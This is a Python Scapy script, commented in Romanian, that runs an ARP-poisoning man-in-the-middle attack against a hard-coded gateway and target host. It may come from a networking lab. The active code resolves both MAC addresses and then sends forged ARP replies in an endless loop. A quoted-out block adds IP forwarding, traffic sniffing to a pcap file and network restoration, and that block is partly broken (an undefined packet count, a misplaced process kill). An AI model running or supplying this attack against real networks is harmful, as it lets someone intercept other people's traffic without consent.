from scapy.all import *
import os
import signal
import sys
import threading
import time

gateway_ip = "198.13.13.1"
target_ip = "198.13.0.14"#rt1

#iau adresa MAC, trimit un ARP request pentru IP si ar trebui sa primesc un reply cu adresa MAC
def get_mac(ip_address):
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s,r in resp:
        return r[ARP].hwsrc
    return None

#trimit reply-uri false pentru a pune pc-ul meu in centru pentru a intercepta pachetele
def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Started ARP poison attack [CTRL-C to stop]")
    while True:
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
        time.sleep(2)
    print("[*] Stopped ARP poison attack.")

print("[*]Starting the script")

gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print("[!] Unable to get gateway MAC address. Exiting..")
    sys.exit(0)
else:
    print("[*] Gateway MAC address: " + str(gateway_mac))
time.sleep(5)

target_mac = get_mac(target_ip)
if target_mac is None:
    print("[!] Unable to get target MAC address. Exiting..")
    sys.exit(0)
else:
    print("[*] Target MAC address: " + str(target_mac))
time.sleep(5)

poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

'''
#activeaza ip forwarding
os.system("sysctl -w net.inet.ip.forwarding=1")


#intoarce totul la normal
def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
    print("[*] Disabling IP forwarding")
    #Disable IP Forwarding on a mac
    os.system("sysctl -w net.inet.ip.forwarding=0")
    #kill process on a mac
os.kill(os.getpid(), signal.SIGTERM)




#salveaza si memoreaza pachetele interceptate
try:
    sniff_filter = "ip host " + target_ip
    print(f"[*] Starting network capture. Packet Count: {packet_count}. Filter: {sniff_filter}")
    packets = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count)
    wrpcap(target_ip + "_capture.pcap", packets)
    print(f"[*] Stopping network capture..Restoring network")
    restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
except KeyboardInterrupt:
    print(f"[*] Stopping network capture..Restoring network")
    restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
sys.exit(0)
'''

